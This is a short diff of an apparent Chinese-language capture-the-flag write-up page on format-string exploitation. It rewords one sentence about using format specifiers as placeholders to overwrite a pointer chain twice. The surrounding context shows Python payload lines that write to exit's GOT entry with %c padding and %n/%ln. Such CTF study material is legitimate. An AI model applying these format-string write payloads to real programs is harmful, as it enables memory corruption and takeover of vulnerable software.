@@ -267,7 +267,7 @@ payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">
 payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png" alt="image-20240607163238561"></p>
-<p>直接使用%p作为占位符的话可以在一条链子上改两次</p>
+<p>直接使用格式化字符作为占位符的话可以在一条链子上改两次</p>
 <pre><code class="highlight python">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span>
 payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></code></pre>
 
